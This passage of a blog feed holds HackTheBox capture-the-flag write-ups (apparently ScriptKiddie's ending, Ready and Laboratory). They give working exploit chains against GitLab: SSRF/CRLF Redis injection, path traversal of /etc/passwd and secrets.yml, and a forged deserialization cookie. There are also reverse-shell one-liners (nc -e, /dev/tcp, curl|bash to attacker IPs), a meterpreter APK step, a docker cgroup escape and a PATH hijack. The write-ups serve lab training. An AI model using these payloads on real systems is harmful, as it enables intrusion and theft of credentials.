subprocess.check_call([&amp;quot;keytool&amp;quot;, &amp;quot;-genkey&amp;quot;, &amp;quot;-keystore&amp;quot;, keystore_file, &amp;quot;-alias&amp;quot;, key_alias, &amp;quot;-storepass&amp;quot;, storepass,
                       &amp;quot;-keypass&amp;quot;, keypass, &amp;quot;-keyalg&amp;quot;, &amp;quot;RSA&amp;quot;, &amp;quot;-keysize&amp;quot;, &amp;quot;2048&amp;quot;, &amp;quot;-dname&amp;quot;, dname])

# Sign APK using our malicious dname
subprocess.check_call([&amp;quot;jarsigner&amp;quot;, &amp;quot;-sigalg&amp;quot;, &amp;quot;SHA1withRSA&amp;quot;, &amp;quot;-digestalg&amp;quot;, &amp;quot;SHA1&amp;quot;, &amp;quot;-keystore&amp;quot;, keystore_file,
                       &amp;quot;-storepass&amp;quot;, storepass, &amp;quot;-keypass&amp;quot;, keypass, apk_file, key_alias])

print()
print(f&amp;quot;[+] Done! apkfile is at {apk_file}&amp;quot;)
print(f&amp;quot;Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&amp;quot;)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s execute the apk file&lt;/p&gt;
&lt;img src=&#34;apk.png&#34;&gt;
&lt;img src=&#34;ff.png&#34;&gt;
And set a listener to get a reverse shell on the box
&lt;img src=&#34;rev1.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s stabilize our shell&lt;/p&gt;
&lt;img src=&#34;stable.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorred-2nd-user--root-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; 2nd USER &amp;amp; Root Flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Looking a bit in the files, we can find an interesting file owned by pwn user!&lt;/p&gt;
&lt;img src=&#34;pwn.png&#34;&gt;
&lt;p&gt;Basically it takes the ips from the hackers file and run nmap on it!&lt;/p&gt;
&lt;p&gt;The idea is to inject a malicious command instead of an ip&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;  ;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.4/4444 0&amp;gt;&amp;amp;1&#39; #&amp;quot; &amp;gt;&amp;gt;hackers
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;We should add two spaces because of the | cut -d&#39; &#39; -f3- |&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;we.png&#34;&gt;
&lt;p&gt;We got a shell as the user pwn!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check if he can run anything as root&lt;/p&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;We can run msfconsole as root! basically a free win :D!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo /opt/metasploit-framework-6.0.9/msfconsole
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;p&gt;And we can execute commands as root&lt;/p&gt;
&lt;img src=&#34;root1.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Ready Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-ready/</link>
      <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-ready/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorred-information-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34; &gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;nmap.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;We only have two ports open&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;22/SSH : OpenSSH 8.2p1 Ubuntu 4&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;5080/http : nginx&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-serverp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server&lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;webpage.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;We get a simple Gitlab sign in page. First let&amp;rsquo;s make an account&lt;/p&gt;
&lt;img src=&#34;register.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;Now let&amp;rsquo;s look for a version or anything that could help us.&lt;/p&gt;
&lt;img src=&#34;gitlab_version.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;We get the gitlab&amp;rsquo;s version and an interesting &lt;code&gt;update asap&lt;/code&gt; highlighted in red, Which means it probably vulnerable&lt;/p&gt;
&lt;img src=&#34;google_poc.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And yeah..! we were right&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Most of the POCs and github repositories were published after the box being launched, so we we won&amp;rsquo;t be using them and we&amp;rsquo;ll do everything manually and get our hands dirty first.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;p-stylecolorred-foothold--user-flag-intended-wayp&#34;&gt;&lt;p style=&#34;color:RED&#34; &gt;Foothold &amp;amp; User Flag (Intended way)&lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Looking at the latest commits, we can understand what we&amp;rsquo;re going to exploit&lt;/p&gt;
&lt;img src=&#34;commits.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;&amp;mdash;&amp;gt; So basically, we&amp;rsquo;re going to bypass the SSRF protection using special IPv6 Addresses as we in the previous picture&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://[0:0:0:0:0:ffff:127.0.0.1]/foo/foo.git
https://[::ffff:127.0.0.1]/foo/foo.git
etc..
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Going back to the commit history, we can see another interesting vulnerability&lt;/p&gt;
&lt;img src=&#34;CRLF.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;img src=&#34;CRLF1.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;This vulnerability will come handy later on by adding newlines to our payload and that&amp;rsquo;s by chaining both of these vulnerabilities in order to get an RCE.&lt;/p&gt;
&lt;p&gt;So now we understood what will be causing the RCE, we can dive in and get our shell!&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll be using the payload mentioned here: &lt;a href=&#34;https://hackerone.com/reports/299473&#34;&gt;https://hackerone.com/reports/299473&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push &amp;quot;{\&amp;quot;class\&amp;quot;:\&amp;quot;GitlabShellWorker\&amp;quot;,\&amp;quot;args\&amp;quot;:[\&amp;quot;class_eval\&amp;quot;,\&amp;quot;open(\&#39;|whoami | nc &amp;lt;ip&amp;gt; 80\&#39;).read\&amp;quot;],\&amp;quot;retry\&amp;quot;:3,\&amp;quot;queue\&amp;quot;:\&amp;quot;system_hook_push\&amp;quot;,\&amp;quot;jid\&amp;quot;:\&amp;quot;ad52abc5641173e217eb2e52\&amp;quot;,\&amp;quot;created_at\&amp;quot;:1513714403.8122594,\&amp;quot;enqueued_at\&amp;quot;:1513714403.8129568}&amp;quot;
 exec

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let&amp;rsquo;s chain both the two previous vulnerabilities.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Before throwing a reverse shell, ping your machine first to confirm that we have code exec on the machine. for the sake of the writeup i&amp;rsquo;ll be getting directly a reverse shell&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push &amp;quot;{\&amp;quot;class\&amp;quot;:\&amp;quot;GitlabShellWorker\&amp;quot;,\&amp;quot;args\&amp;quot;:[\&amp;quot;class_eval\&amp;quot;,\&amp;quot;open(\&#39;|nc 10.10.14.17 4444 -e /bin/bash \&#39;).read\&amp;quot;],\&amp;quot;retry\&amp;quot;:3,\&amp;quot;queue\&amp;quot;:\&amp;quot;system_hook_push\&amp;quot;,\&amp;quot;jid\&amp;quot;:\&amp;quot;ad52abc5641173e217eb2e52\&amp;quot;,\&amp;quot;created_at\&amp;quot;:1513714403.8122594,\&amp;quot;enqueued_at\&amp;quot;:1513714403.8129568}&amp;quot;
 exec
 exec
/elleuch.git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We URL encode our payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/A%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Cnc%2010.10.14.17%204444%20-e%20%2Fbin%2Fbash%20%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/elleuch.git

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So now we have a ready-to-use payload, let&amp;rsquo;s back to the web page to see where we&amp;rsquo;re gonna throw it&lt;/p&gt;
&lt;img src=&#34;repo.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And yeah! We can import projects by URLs, Exactly what we needed&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s use our payload and set a listener and see if we get a shell&lt;/p&gt;
&lt;img src=&#34;rev1.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get a proper shell&lt;/p&gt;
&lt;img src=&#34;stable.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And grab the user.txt&lt;/p&gt;
&lt;img src=&#34;user.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorreduser-flag-unintended-wayp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Flag (Unintended way)&lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;When i first rooted the box, it seemed to be also vulnerable to&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Arbitrary file read via the UploadsRewriter when moving an issue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;That we already done in &lt;a href=&#34;https://mohamed-elleuch.me/writeups/htb-laboratory/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Laboratory Writeup&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I am not sure if the creator patched it or no, but  you can still try it !&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Step1 : Get /etc/passwd&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Step2 : Get /home/dude/user.txt&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/dude/user.txt)

&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privesc-method-1-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc (Method 1 )&lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;After enumerating a bit, we can find an interesting file&lt;/p&gt;
&lt;img src=&#34;rb.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;Which contains a password&lt;/p&gt;
&lt;img src=&#34;pass.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And it turns out to be the password the root of this docker container&lt;/p&gt;
&lt;img src=&#34;rootdocker.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;Now our goal is to escape it !&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check the &lt;code&gt;/opt/backup/docker-compose.yml&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;Priv.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;It seems like we&amp;rsquo;re in a privileged docker!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;An interesting blog post to check ! &lt;a href=&#34;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&#34;&gt;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x
 
echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release
host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
echo &amp;quot;$host_path/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent
 
echo &#39;#!/bin/sh&#39; &amp;gt; /cmd
echo &amp;quot;echo &#39;public_rsa&#39; &amp;gt; /root/.ssh/authorized_keys &amp;quot; &amp;gt;&amp;gt; /cmd
chmod a+x /cmd
 
sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;And voilÃ  we&amp;rsquo;re root!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privesc-method-2p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc (Method 2)&lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Way simpler than first one!&lt;/p&gt;
&lt;p&gt;First let&amp;rsquo;s check mounts&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;df -aTh   # Or mount -l
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dev.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;let&amp;rsquo;s try to mount &lt;code&gt;/dev/sda2&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;myroot.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
And yeaah! we can access the box&#39;s file system
&lt;p&gt;Let&amp;rsquo;s check if we can grab the root flag and it&amp;rsquo;s ssh private key&lt;/p&gt;
&lt;img src=&#34;ssh.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;p&gt;Now let&amp;rsquo;s ssh into root with his key&lt;/p&gt;
&lt;img src=&#34;last.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-laboratory/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.216 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have 3 ports open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh: 22 running OpenSSH 8.2p1&lt;/li&gt;
&lt;li&gt;http: 80 running Apache httpd 2.4.41&lt;/li&gt;
&lt;li&gt;https: 443 running Apache httpd 2.4.41&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2 Domains:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;laboratory.htb&lt;/li&gt;
&lt;li&gt;git.laboratory.htb&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enumerationp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration&lt;/p&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;After adding laboratory.htb &amp;amp; git.laboratory.htb to /etc/hosts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s check laboratory.htb first&lt;/p&gt;
&lt;img src=&#34;users.png&#34;&gt;
&lt;p&gt;We got 2 usernames:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dexter&lt;/li&gt;
&lt;li&gt;DeeDee Dee_Dee ..&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping Gobuster scans, as it gave me nothing interesting&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Seems like it&amp;rsquo;s a static website, nothing much to see!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s move to git.laboratory.htb&lt;/p&gt;
&lt;img src=&#34;gitlab.png&#34;&gt;
&lt;p&gt;Tried few logins but it failed, ( dexter:admin dexter:password )&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create our own account and see what we can do&lt;/p&gt;
&lt;img src=&#34;reg.png&#34;&gt;
&lt;p&gt;&lt;code&gt;GitLab Community Edition 12.8.1&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;git_ver.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial foothold &lt;/p&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I think there are ready-to-use scripts to exploit this gitlab version, but we&amp;rsquo;ll do the process manually!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Bascially we&amp;rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the &lt;code&gt;secret_key_base&lt;/code&gt; from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you wanna read more about this exploit: &lt;a href=&#34;https://hackerone.com/reports/827052&#34;&gt;https://hackerone.com/reports/827052&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s now try to read /etc/passwd from the box&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s first create 2 projects&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;pro.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s create an issue in one of these projets&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;passwd.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s now move it to the other project&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;move.png&#34;&gt;
&lt;img src=&#34;passwd1.png&#34;&gt;
And we get the file!
&lt;img src=&#34;passwd2.png&#34;&gt;
&lt;p&gt;Now let&amp;rsquo;s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;secret.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s now setup our gitlab env!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You can either download the gitlab package or use docker&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For this, I am going to use docker! First let&amp;rsquo;s pull the image&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker -D pull gitlab/gitlab-ce:12.8.1-ce.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then run it !&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker run -it gitlab/gitlab-ce:12.8.1-ce.0 sh
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;docker.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: &lt;code&gt;id&lt;/code&gt; command ; force of habit xD&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl reconfigure
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got!
Now, let&amp;rsquo;s run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl restart
gitlab-rails console
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here in the console, we&amp;rsquo;ll craft our cookie to gain access!&lt;/p&gt;
&lt;p&gt;Our payload to craft it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;request = ActionDispatch::Request.new(Rails.application.env_config)
request.env[&amp;quot;action_dispatch.cookies_serializer&amp;quot;] = :marshal
cookies = request.cookie_jar

erb = ERB.new(&amp;quot;&amp;lt;%= `curl http://10.10.14.3:8000/shell | bash` %&amp;gt;&amp;quot;) 
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;quot;@result&amp;quot;, ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;cookie.png&#34;&gt;
&lt;p&gt;Final payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -vvv &#39;https://git.laboratory.htb/users/sign_in&#39; -b &amp;quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b&amp;quot; -k
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s set a listener, and grab that shell&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;So now we&amp;rsquo;re on a docker container as the &lt;strong&gt;git&lt;/strong&gt; user!
The trick now is to change the gitlab&amp;rsquo;s admin (who is id=1) password&lt;/p&gt;
&lt;p&gt;Going through gitlab&amp;rsquo;s docs to get the right syntax
&lt;a href=&#34;https://docs.gitlab.com/ee/security/reset_user_password.html&#34;&gt;https://docs.gitlab.com/ee/security/reset_user_password.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It may take a while to run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-rails console -e production
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;user = User.find(1)
user.password = &#39;password123&#39;
user.password_confirmation = &#39;password123&#39;
user.save!
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dexterpass.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s login now with his account&lt;/p&gt;
&lt;img src=&#34;projects.png&#34;&gt;
&lt;p&gt;There is a private repo that contains his home directory backup!&lt;/p&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s copy his ssh private key and get into the box!&lt;/p&gt;
&lt;img src=&#34;user.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s first run Linpeas!
Going through the output, we can see that there is unusual suid binary
&lt;img src=&#34;suid.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s run Ltrace on this binary&lt;/p&gt;
&lt;img src=&#34;ltrace.png&#34;&gt;
&lt;p&gt;We can abuse this binary, by creating a fake malicious chmod binary&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;/bin/bash -p&amp;quot; &amp;gt; /tmp/chmod
chmod 777 /tmp/chmod
export PATH=/tmp:$PATH
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then we run the binary!&lt;/p&gt;
&lt;img src=&#34;root.png&#34;&gt;
And we rooted the box!
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Luanne Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-luanne/</link>
